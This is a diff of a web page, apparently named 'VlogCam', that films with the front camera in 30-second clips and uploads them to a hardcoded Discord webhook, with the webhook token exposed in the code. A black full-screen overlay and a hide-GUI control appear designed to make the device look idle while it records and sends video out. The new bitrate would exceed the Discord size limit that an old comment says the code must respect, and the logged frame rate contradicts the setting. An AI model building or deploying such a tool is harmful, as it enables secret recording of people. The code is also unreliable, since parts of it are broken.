@@ -55,13 +55,13 @@
             pointer-events: auto;
         }
 
-        /* ── UI elements (all at bottom, no top) ── */
+        /* ── UI elements (hidden in fullscreen) ── */
         .ui-element {
             transition: opacity 0.3s ease, transform 0.2s ease;
             z-index: 2;
         }
 
-        /* red recording dot – bottom right (above counter) */
+        /* red recording dot – bottom right */
         #dot {
             position: fixed;
             bottom: 80px;
@@ -104,11 +104,11 @@
         /* timer – bottom center */
         #timer {
             position: fixed;
-            bottom: 120px;
+            bottom: 100px;
             left: 50%;
             transform: translateX(-50%);
             z-index: 2;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 500;
             color: rgba(255, 255, 255, 0.6);
             background: rgba(0, 0, 0, 0.5);
@@ -125,37 +125,11 @@
             text-align: center;
         }
 
-        /* status – bottom center (below timer) */
-        #status {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 2;
-            font-size: 14px;
-            font-weight: 400;
-            color: rgba(255, 255, 255, 0.25);
-            pointer-events: none;
-            font-variant-numeric: tabular-nums;
-            letter-spacing: 0.3px;
-            padding: 4px 16px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 20px;
-            backdrop-filter: blur(2px);
-            transition: opacity 0.8s;
-            text-align: center;
-            white-space: nowrap;
-        }
-        #status.error {
-            color: rgba(255, 70, 70, 0.6);
-            font-weight: 500;
-        }
-
-        /* ── BUTTONS (left side, bottom) ── */
+        /* ── BUTTONS (left side, easy to tap) ── */
         .ctrl-btn {
             position: fixed;
             left: 20px;
-            z-index: 1000;
+            z-index: 1000; /* well above everything */
             background: rgba(255, 255, 255, 0.08);
             border: 1px solid rgba(255, 255, 255, 0.15);
             color: rgba(255, 255, 255, 0.7);
@@ -192,6 +166,28 @@
             bottom: 28px;
         }
 
+        /* status text – top center */
+        #status {
+            position: fixed;
+            top: 24px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.15);
+            z-index: 2;
+            pointer-events: none;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 0.3px;
+            padding: 0 20px;
+            transition: opacity 0.8s;
+        }
+        #status.error {
+            color: rgba(255, 70, 70, 0.6);
+            font-weight: 500;
+        }
+
         /* ── fullscreen overrides (hide everything) ── */
         .fullscreen-ui #dot,
         .fullscreen-ui #counter,
@@ -204,11 +200,10 @@
             transition: opacity 0.4s;
         }
 
-        /* ── hide GUI overrides (hide dot, counter, timer, status) ── */
+        /* ── hide GUI overrides (hide dot, counter, timer) ── */
         body.gui-hidden #dot,
         body.gui-hidden #counter,
-        body.gui-hidden #timer,
-        body.gui-hidden #status {
+        body.gui-hidden #timer {
             opacity: 0 !important;
             pointer-events: none !important;
             transition: opacity 0.3s;
@@ -239,16 +234,19 @@
 </head>
 <body>
 
+    <!-- hidden video element -->
     <video id="video" autoplay playsinline muted></video>
+
+    <!-- tap target – full black -->
     <div id="screen" role="button" aria-label="Toggle fullscreen"></div>
 
-    <!-- UI elements – all at bottom -->
+    <!-- UI elements -->
     <div id="dot" class="paused ui-element"></div>
     <div id="counter" class="ui-element">◉ 0 clips sent</div>
     <div id="timer" class="ui-element">00:30</div>
-    <div id="status" class="ui-element">● ready</div>
     <button id="hide-gui-btn" class="ctrl-btn ui-element" aria-label="Hide GUI">👁</button>
     <button id="fs-btn" class="ctrl-btn ui-element" aria-label="Toggle fullscreen">⛶</button>
+    <div id="status" class="ui-element">● ready</div>
 
     <script>
         (function() {
@@ -258,18 +256,9 @@
             const WEBHOOK = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
             const CLIP_DURATION_MS = 30000; // 30 seconds
-
-            // --- Target file size ~9MB (Discord limit 10MB) ---
-            // Bitrate = 9 MB * 8 / 30s = 2.4 Mbps total (video+audio)
-            // We set video to 2.2 Mbps, audio to 128 kbps
-            const VIDEO_BITRATE = 2200000; // 2.2 Mbps
-            const AUDIO_BITRATE = 128000;   // 128 kbps
-
-            const FPS_IDEAL = 5; // 5 FPS – very low to keep file small
-
-            // Prioritize efficient codecs
+            const BITRATE = 8000000; // 8 Mbps for 4K
+            const FPS_IDEAL = 60;
             const MIME_TYPES = [
-                'video/webm;codecs=vp09',
                 'video/webm;codecs=vp9',
                 'video/webm;codecs=vp8',
                 'video/webm;codecs=h264',
@@ -294,7 +283,7 @@
             let isRecording = false;
             let isPaused = false;
             let clipTimer = null;
-            let clipRemainingSeconds = 30;
+            let clipRemainingSeconds = 30; // 30 seconds
             let timerInterval = null;
 
             // ─── HELPERS ───────────────────────────────────────────────
@@ -302,13 +291,12 @@
             function setStatus(msg, isError = false) {
                 statusEl.textContent = msg;
                 statusEl.className = isError ? 'error' : '';
-                // auto-fade after 5s for non-errors
                 if (!isError) {
                     clearTimeout(statusEl._fadeTimer);
                     statusEl.style.opacity = '1';
                     statusEl._fadeTimer = setTimeout(() => {
-                        statusEl.style.opacity = '0.4';
-                    }, 5000);
+                        statusEl.style.opacity = '0.2';
+                    }, 6000);
                 } else {
                     statusEl.style.opacity = '1';
                 }
@@ -344,13 +332,13 @@
                     clearInterval(timerInterval);
                     timerInterval = null;
                 }
-                clipRemainingSeconds = 30;
+                clipRemainingSeconds = 30; // reset to 30 seconds
                 updateTimerDisplay();
                 timerInterval = setInterval(() => {
                     clipRemainingSeconds--;
                     updateTimerDisplay();
                     if (clipRemainingSeconds <= 0) {
-                        // will be reset by scheduleNextClip
+                        // timer will be reset by scheduleNextClip
                     }
                 }, 1000);
             }
@@ -402,6 +390,7 @@
                 } catch (_) { /* ignore */ }
             }
 
+            // Button events with stopPropagation to prevent screen toggle
             fsBtn.addEventListener('click', (e) => {
                 e.stopPropagation();
                 toggleFullscreen();
@@ -424,9 +413,11 @@
             });
             hideGuiBtn.addEventListener('touchstart', (e) => {
                 e.stopPropagation();
+                // Simulate click for mobile
                 hideGuiBtn.click();
             }, { passive: true });
 
+            // Tap on screen toggles fullscreen (only if not clicking a button)
             screenEl.addEventListener('click', (e) => {
                 if (e.target === screenEl) {
                     toggleFullscreen();
@@ -490,7 +481,7 @@
                     return s;
                 } catch (err) {
                     console.error('[VlogCam] getUserMedia failed:', err);
-                    // Fallback to 1080p if 4K fails
+                    // fallback: try 1080p if 4K not supported
                     try {
                         const fallbackConstraints = {
                             video: {
@@ -525,11 +516,8 @@
                 const mimeType = getSupportedMimeType();
                 const options = {
                     mimeType: mimeType || undefined,
-                    videoBitsPerSecond: VIDEO_BITRATE,
-                    audioBitsPerSecond: AUDIO_BITRATE,
-                    // Try constant bitrate to avoid spikes that exceed limit
-                    // @ts-ignore - experimental
-                    bitrateMode: "constant"
+                    videoBitsPerSecond: BITRATE,
+                    audioBitsPerSecond: 128000
                 };
 
                 try {
@@ -601,7 +589,9 @@
                     clipTimer = null;
                     if (stream && isRecording) {
                         try {
+                            // Reset and start timer for the new clip
                             startTimer();
+
                             recorder = startRecorder(stream);
                             const stopTimer = setTimeout(() => {
                                 if (recorder && recorder.state === 'recording') {
@@ -632,8 +622,6 @@
             // ─── UPLOAD ────────────────────────────────────────────────
 
             async function uploadToDiscord(blob) {
-                // Check file size – if > 9.5MB, we might need to reduce quality further.
-                // But we trust our bitrate calculation.
                 const filename = `clip_${String(++clipCounter).padStart(4, '0')}.webm`;
 
                 const formData = new FormData();
@@ -772,7 +760,7 @@
                     }, CLIP_DURATION_MS);
                     recorder._stopTimer = stopTimer;
 
-                    console.log('[VlogCam] ready, recording 4K 5fps from front camera');
+                    console.log('[VlogCam] ready, recording 4K 15fps from front camera');
                     setStatus('● recording', false);
 
                 } catch (err) {
